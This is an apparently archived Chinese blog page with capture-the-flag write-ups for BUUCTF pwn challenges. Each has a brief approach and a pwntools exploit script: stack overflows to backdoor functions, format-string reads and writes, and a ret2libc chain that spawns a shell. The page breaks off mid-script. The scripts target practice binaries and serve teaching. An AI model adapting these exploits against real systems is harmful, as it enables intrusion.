@@ -1,0 +1,951 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="voidchunk">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="BUUCTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF wp">
+<meta property="og:url" content="https://voidchunk.github.io/2024/05/29/BUUCTF-wp/index.html">
+<meta property="og:site_name" content="voidchunk&#39;s blog">
+<meta property="og:description" content="BUUCTF">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-05-29T15:39:06.000Z">
+<meta property="article:modified_time" content="2025-03-15T15:20:44.193Z">
+<meta property="article:author" content="voidchunk">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="WP">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>BUUCTF wp - voidchunk&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"voidchunk.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>voidchunk</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="https://github.com/voidchunk" target="_self">
+                <i class="iconfont icon-github-fill"></i>
+                <span>GitHub</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="BUUCTF wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-05-29 23:39" pubdate>
+          2024年5月29日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          25 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">BUUCTF wp</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年3月15日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>BUUCTF</p>
+<span id="more"></span>
+
+<blockquote>
+<p>BUUCTF的部分wp<br>后面的有时间再做</p>
+</blockquote>
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>简单题，直接nc</p>
+<h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>程序中给了后门，直接ret2text，注意一下栈平衡</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote(&quot;node5.buuoj.cn&quot;,29672)</span><br>p = process(<span class="hljs-string">&quot;pwn1&quot;</span>)<br><br>gdb.attach(p)<br><br>backdoor = <span class="hljs-number">0x401186</span><br>ret = <span class="hljs-number">0x401185</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">15</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(backdoor)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>ret2text简单题</p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">25110</span>)<br><span class="hljs-comment">#p = process(&quot;./warmup_csaw_2016&quot;)</span><br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;WOW:&quot;</span>)<br>back = p.recv(<span class="hljs-number">8</span>)<br>back = <span class="hljs-built_in">int</span>(back,<span class="hljs-number">16</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x40</span>+<span class="hljs-number">0x8</span>)+p64(back)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>可以覆盖栈中的浮点数，也可以直接覆盖返回地址</p>
+<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h4 id="覆盖浮点数"><a href="#覆盖浮点数" class="headerlink" title="覆盖浮点数"></a>覆盖浮点数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> struct<br><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">28058</span>)<br><span class="hljs-comment">#p = process(&quot;./ciscn_2019_n_1&quot;)</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">44</span>+struct.pack(<span class="hljs-string">&quot;&lt;fx&quot;</span>,<span class="hljs-number">11.28125</span>)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="覆盖返回地址"><a href="#覆盖返回地址" class="headerlink" title="覆盖返回地址"></a>覆盖返回地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">26493</span>)<br><span class="hljs-comment">#p = process(&quot;./ciscn_2019_n_1&quot;)</span><br><br>catflag_addr = <span class="hljs-number">0x4006be</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">56</span>+p64(catflag_addr)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><p>程序中替换了输入中的’I’为’you’，并赋值回原位置，从而造成了栈溢出</p>
+<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">26533</span>)<br>backdoor = <span class="hljs-number">0x08048F0D</span><br>payload = <span class="hljs-string">b&#x27;I&#x27;</span>*<span class="hljs-number">20</span>+<span class="hljs-string">b&#x27;aaaa&#x27;</span>+p32(backdoor)<br>p.sendline(payload) <br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h2><h3 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h3><p>ret2text</p>
+<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">28636</span>)<br><br>backdoor = <span class="hljs-number">0x400596</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">128</span>+<span class="hljs-number">0x8</span>)+p64(backdoor)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h2><h3 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h3><p>格式化字符串漏洞，有两种思路</p>
+<ol>
+<li>利用格式化字符串漏洞读取全局变量的值</li>
+<li>利用格式化字符串漏洞覆盖全局变量的值</li>
+</ol>
+<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><h4 id="读"><a href="#读" class="headerlink" title="读"></a>读</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment">#p = remote(&quot;node5.buuoj.cn&quot;,27945)</span><br><br>bss_addr = <span class="hljs-number">0x804c044</span><br><br>payload = p32(bss_addr)+<span class="hljs-string">b&#x27;%10$s&#x27;</span><br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">b&quot;Hello,&quot;</span>)<br>num = u32(p.recv()[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>])<br><br><span class="hljs-comment">#info(num)</span><br><br>p.sendline(<span class="hljs-built_in">str</span>(num).encode())<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h4 id="写"><a href="#写" class="headerlink" title="写"></a>写</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">27945</span>)<br><br>bss_addr = <span class="hljs-number">0x804c044</span><br><br>payload = p32(bss_addr)+p32(bss_addr+<span class="hljs-number">1</span>)+p32(bss_addr+<span class="hljs-number">2</span>)+p32(bss_addr+<span class="hljs-number">3</span>)+<span class="hljs-string">b&#x27;%10$n&#x27;</span>+<span class="hljs-string">b&#x27;%11$n&#x27;</span>+<span class="hljs-string">b&#x27;%12$n&#x27;</span>+<span class="hljs-string">b&#x27;%13$n&#x27;</span><br><br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">b&quot;passwd:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x10101010</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h2><h3 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h3><p>32位函数调用传参</p>
+<h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">27981</span>)<br><br>hint_addr = <span class="hljs-number">0x804A024</span><br>system_addr = <span class="hljs-number">0x8048320</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">136</span>+<span class="hljs-number">4</span>)+p32(system_addr)+p32(<span class="hljs-number">0</span>)+p32(hint_addr)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><h3 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h3><p>覆盖<code>var[13]</code>成0x11即可</p>
+<h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./ciscn_2019_n_8&quot;</span>)<br><span class="hljs-comment">#p = remote(&quot;node5.buuoj.cn&quot;,25702)</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">52</span>+p32(<span class="hljs-number">0x11</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;name&quot;</span>)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h2><h3 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h3><p>ret2text</p>
+<h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context(log_level=&#x27;debug&#x27;)</span><br><span class="hljs-comment">#p = process(&quot;./bjdctf_2020_babystack&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">27726</span>)<br><br>backdoor = <span class="hljs-number">0x4006e7</span><br><br>payload = <span class="hljs-string">b&#x27;100&#x27;</span><br>p.recvuntil(<span class="hljs-string">b&quot;length&quot;</span>)<br>p.sendline(payload)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">16</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(backdoor)<br>p.recvuntil(<span class="hljs-string">b&quot;What&#x27;s u name?&quot;</span>)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><h3 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h3><p>ret2libc，利用puts泄露地址</p>
+<h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">26179</span>)<br><span class="hljs-comment">#p = process(&#x27;./ciscn_2019_c_1&#x27;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>gets_got = elf.got[<span class="hljs-string">&#x27;gets&#x27;</span>]<br><br>pop_rdi = <span class="hljs-number">0x400c83</span><br>ret = <span class="hljs-number">0x4006b9</span><br>encrypt = <span class="hljs-number">0x4009a0</span><br><br>puts_offset = <span class="hljs-number">0x0809c0</span><br>system_offset = <span class="hljs-number">0x04f440</span><br>binsh_offset = <span class="hljs-number">0x1b3e9a</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;Input your choice!&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>+<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">87</span><br>payload+= p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Input your Plaintext to be encrypted&#x27;</span>)<br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">b&quot;Ciphertext&quot;</span>)<br>puts_addr = u64(p.recv(<span class="hljs-number">8</span>)[<span class="hljs-number">2</span>:<span class="hljs-number">8</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>info(<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc_base = puts_addr - puts_offset<br>system_addr = libc_base + system_offset<br>binsh_addr = libc_base + binsh_offset<br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>+<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">87</span><br>payload+= p64(pop_rdi)+p64(binsh_addr)+p64(ret)+p64(system_addr)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><h3 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h3><p>三种思路</p>
+<ol>
+<li>溢出到get_flag然后再溢出到exit，使程序正常退出并给我们回显flag</li>
+<li>利用系统调用获取shell</li>
+<li>利用mprotect修改保护情况，再写shellcode</li>
+</ol>
+<h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><h4 id="get-flag-exit"><a href="#get-flag-exit" class="headerlink" title="get_flag + exit"></a>get_flag + exit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">26800</span>)<br><span class="hljs-comment">#p = process(&quot;./get_started_3dsctf_2016&quot;)</span><br><span class="hljs-comment">#context(log_level=&quot;debug&quot;)</span><br><br>param1 = <span class="hljs-number">0x308cd64f</span><br>param2 = <span class="hljs-number">0x195719d1</span><br>get_flag = <span class="hljs-number">0x080489a0</span><br><span class="hljs-comment">#get_flag = 0x80489b8</span><br>exit_addr=<span class="hljs-number">0x804e6a0</span><br>sleep(<span class="hljs-number">0.1</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span 